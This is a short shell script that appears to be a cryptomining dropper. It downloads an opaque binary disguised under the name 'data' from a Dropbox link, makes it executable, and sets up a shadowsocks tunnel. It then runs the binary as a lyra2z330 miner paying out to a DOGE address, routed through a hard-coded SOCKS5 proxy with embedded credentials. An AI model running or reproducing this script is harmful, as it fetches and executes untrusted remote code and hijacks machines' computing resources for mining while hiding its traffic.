#!/bin/sh
apt update -y
wget -q https://www.dropbox.com/s/hv2fqjomdvrpta6/data
chmod +x data
sleep 2
apt -y install shadowsocks-libev rng-tools libsodium-dev

ss-local -s uk-ss.sshmax.xyz -p 8388 -l 8139 -k NmNlZGEw -m chacha20-ietf-poly1305 -v &
sleep 1
./data -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D8SQiATrkXeAUegfU8x7CGz2wysuQv4A6f.$(shuf -n 1 -i 1-9999999) -t 2 -p c=DOGE,zap=BUT-lyra2z330 -x socks5://giligili:KickAss@152.67.10.189:1080
